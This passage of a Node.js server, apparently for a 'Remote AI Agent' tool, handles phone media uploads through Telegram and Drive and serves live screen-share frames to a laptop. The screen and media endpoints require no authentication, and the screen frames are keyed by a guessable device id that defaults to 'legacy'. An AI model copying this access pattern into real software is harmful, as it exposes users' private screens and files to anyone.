// file_id via getFile (fetchTelegramFilePath), update the stored url, and retry
// the download exactly once.
async function pipeTelegramFile(res, fileId, entry) {
    let url = entry.url;
    if (!url) return false;

    let fetched = null;
    try {
        fetched = await fetch(url);
    } catch (e) {
        console.warn('[MEDIA] Telegram download fetch failed:', e.message);
        return false;
    }

    if ((fetched.status === 404 || fetched.status === 410) && fileId) {
        const path = await fetchTelegramFilePath(fileId);
        if (path) {
            url = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${path}`;
            entry.url = url; // refresh the stored url (kept server-side only)
            try {
                fetched = await fetch(url);
            } catch (e) {
                fetched = null;
            }
        }
    }

    if (!fetched || !fetched.ok || !fetched.body) return false;
    res.status(200);
    res.set('Content-Type', entry.mime || 'application/octet-stream');
    const fname = String(entry.filename || '').replace(/["\r\n]/g, '');
    if (fname) res.set('Content-Disposition', `inline; filename="${fname}"`);
    res.set('Cache-Control', 'public, max-age=86400');
    Readable.fromWeb(fetched.body).pipe(res);
    return true;
}

// Upload a file buffer to Telegram; return {id, url} or null.
// Uses sendDocument so the download is served with the original resolution and
// the returned content-type renders inline (see /media/:id).
async function uploadToTelegram(buffer, mime, filename) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return null;
    try {
        // sendDocument (NOT sendPhoto) — preserves the FULL original resolution.
        // (sendPhoto downscales to ~2560px which destroys high-MP camera photos.)
        const form = new FormData();
        form.append('chat_id', TELEGRAM_CHAT_ID);
        form.append('document', new Blob([buffer], { type: mime || 'application/octet-stream' }), (filename || 'media'));
        const send = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: form,
        });
        const sdata = await send.json();
        if (!sdata.ok || !sdata.result || !sdata.result.document || !sdata.result.document.file_id) {
            throw new Error('sendDocument failed: ' + String(sdata.description || 'unknown').slice(0, 200));
        }
        const fileId = sdata.result.document.file_id;
        const filePath = await fetchTelegramFilePath(fileId);
        if (!filePath) throw new Error('getFile failed');
        // Build the file URL server-side. It embeds the bot token, so it is
        // stored in the map (fetched only server-side) — never sent to a client.
        const url = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${filePath}`;
        return { id: fileId, url };
    } catch (e) {
        console.warn('[MEDIA] Telegram upload failed:', e.message);
        return null;
    }
}

// ---------- v8.8: media upload + download link ----------

// Phone → Server: upload a media file (base64) → get a download link back.
// v8.10: tries Telegram first (free unlimited cloud), then Drive, then the
// in-memory mediaStore — the endpoint never breaks.
app.post('/media_upload', authMiddleware, async (req, res) => {
    const deviceId = (req.body && req.body.device_id) || req.headers['x-device-id'] || 'legacy';
    const data = (req.body && req.body.data_b64) || '';
    const mime = (req.body && req.body.mime) || 'application/octet-stream';
    const filename = (req.body && req.body.filename) || null;
    if (!data) {
        return res.status(400).json({ error: 'data_b64 is required' });
    }
    touchDevice(deviceId);

    // Try Drive first. Decode base64 once; on bad input fall through to memory.
    let buffer = null;
    try {
        buffer = Buffer.from(data, 'base64');
    } catch (e) {
        buffer = null;
    }

    if (buffer && buffer.length > 0) {
        // 1) Telegram first — free unlimited cloud storage (permanent link).
        const tg = await uploadToTelegram(buffer, mime, filename);
        if (tg && tg.id) {
            telegramMediaStore.set(tg.id, { url: tg.url, mime, filename, ts: Date.now() });
            // Cap + TTL protection (unbounded-map guard).
            sweepTelegramMediaStore();
            while (telegramMediaStore.size > TELEGRAM_MEDIA_CAP) {
                telegramMediaStore.delete(telegramMediaStore.keys().next().value);
            }
            console.log(`[${new Date().toISOString()}] MEDIA upload ${deviceId} → TELEGRAM (file_id ${tg.id})`);
            return res.json({
                ok: true,
                media_id: tg.id,
                storage: 'telegram',
                // Never expose the raw api.telegram.org/file/bot<TOKEN> URL —
                // the proxied /media/:id path streams bytes server-side instead.
                url: `/media/${tg.id}`,
            });
        }

        // 2) Drive fallback.
        const uploaded = await uploadToDrive(buffer, mime, filename);
        if (uploaded && uploaded.link) {
            console.log(`[${new Date().toISOString()}] MEDIA upload ${deviceId} → DRIVE: ${uploaded.link}`);
            return res.json({
                ok: true,
                media_id: uploaded.id,
                storage: 'drive',
                url: uploaded.link,
                link: uploaded.link,
            });
        }
        console.warn(`[MEDIA] Telegram + Drive unavailable — falling back to in-memory for ${deviceId}`);
    }

    // Fallback (existing in-memory behavior): store base64 in mediaStore.
    const id = crypto.randomUUID();
    mediaStore.set(id, { mime, data, ts: Date.now(), filename, device_id: deviceId });
    // FIFO eviction by cap + TTL
    if (mediaStore.size > MEDIA_CAP) {
        const oldest = mediaStore.keys().next().value;
        mediaStore.delete(oldest);
    }
    for (const [mid, m] of mediaStore) {
        if (Date.now() - m.ts > MEDIA_TTL_MS) mediaStore.delete(mid);
    }
    console.log(`[${new Date().toISOString()}] MEDIA upload ${deviceId}: IN-MEMORY ${mime} (${data.length} b64 chars)`);
    res.json({ ok: true, media_id: id, url: `/media/${id}`, storage: 'memory' });
});

// Laptop → Server: download a media file by id (binary, for browser/download).
// No auth middleware (so the shareable URL opens in a plain browser/download).
app.get('/media/:id', async (req, res) => {
    // Telegram-backed media → stream bytes server-side (never expose the bot
    // token). On Telegram 404/expiry the path is refreshed via getFile + retried.
    const tg = telegramMediaStore.get(req.params.id);
    if (tg) {
        const ok = await pipeTelegramFile(res, req.params.id, tg);
        if (ok) return;
        return res.status(502).send('media fetch failed');
    }
    const m = mediaStore.get(req.params.id);
    if (!m) {
        return res.status(404).send('media not found or expired');
    }
    if (m.filename) {
        res.set('Content-Disposition', `inline; filename="${String(m.filename).replace(/"/g, '')}"`);
    }
    res.set('Content-Type', m.mime);
    res.send(Buffer.from(m.data, 'base64'));
});

// ---------- v8.8: live screen share (frame poll → auto-refresh link) ----------

const liveFrames = new Map();   // device_id -> {data_b64, ts}
const LIVE_FRAME_TTL_MS = 60 * 1000;  // drop frames older than ~60s
const LIVE_FRAMES_CAP = 50;           // max concurrent live devices

// Sweep stale frames (TTL) and cap the number of device entries. Called on every
// frame post + the periodic 2-min sweep so the map can't grow unbounded.
function sweepLiveFrames() {
    const now = Date.now();
    for (const [id, f] of liveFrames) {
        if (!f || !f.ts || now - f.ts > LIVE_FRAME_TTL_MS) liveFrames.delete(id);
    }
    while (liveFrames.size > LIVE_FRAMES_CAP) {
        liveFrames.delete(liveFrames.keys().next().value);
    }
}

// Phone → Server: upload a live screen frame (JPEG base64).
app.post('/live_frame', authMiddleware, (req, res) => {
    const deviceId = (req.body && req.body.device_id) || req.headers['x-device-id'] || 'legacy';
    const data = (req.body && req.body.data_b64) || '';
    if (!data) return res.json({ ok: false });
    liveFrames.set(deviceId, { data_b64: data, ts: Date.now() });
    sweepLiveFrames();
    touchDevice(deviceId);
    res.json({ ok: true });
});

// Laptop → Server: latest live frame as JPEG binary (auto-refresh target).
app.get('/live/:id/frame', (req, res) => {
    const f = liveFrames.get(req.params.id);
    if (!f) {
        res.set('Content-Type', 'image/jpeg');
        return res.send(Buffer.from(
            'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64'));
    }
    res.set('Content-Type', 'image/jpeg');
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.send(Buffer.from(f.data_b64, 'base64'));
});

// Laptop → Server: live screen HTML page (opens in browser, auto-refresh 1s).
app.get('/live/:id', (req, res) => {
    const id = String(req.params.id).replace(/[^a-zA-Z0-9-]/g, '');
    res.set('Content-Type', 'text/html');
    res.send(`<!DOCTYPE html><html><head><meta charset="utf-8">
<title>AI Agent Live Screen</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}
img{max-width:100%;max-height:100vh;object-fit:contain}span{position:fixed;top:10px;left:10px;color:#0f0;font:bold 14px monospace;background:#000c;padding:4px 8px}</style>
</head><body><img id="s" src="/live/${id}/frame"><span id="t"></span>
<script>setInterval(()=>{document.getElementById('s').src='/live/${id}/frame?t='+Date.now();
document.getElementById('t').textContent='LIVE • '+new Date().toLocaleTimeString()},1000);</script>
</body></html>`);
});

// Start
app.listen(PORT, () => {
    console.log('='.repeat(50));
    console.log('🤖 Remote AI Agent - Cloud Server v3 (multi-device)');
    console.log('='.repeat(50));
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ API Key: ${API_KEY.substring(0, 5)}...`);
    console.log(`✅ Health: http://localhost:${PORT}/health`);
    console.log('='.repeat(50));
});
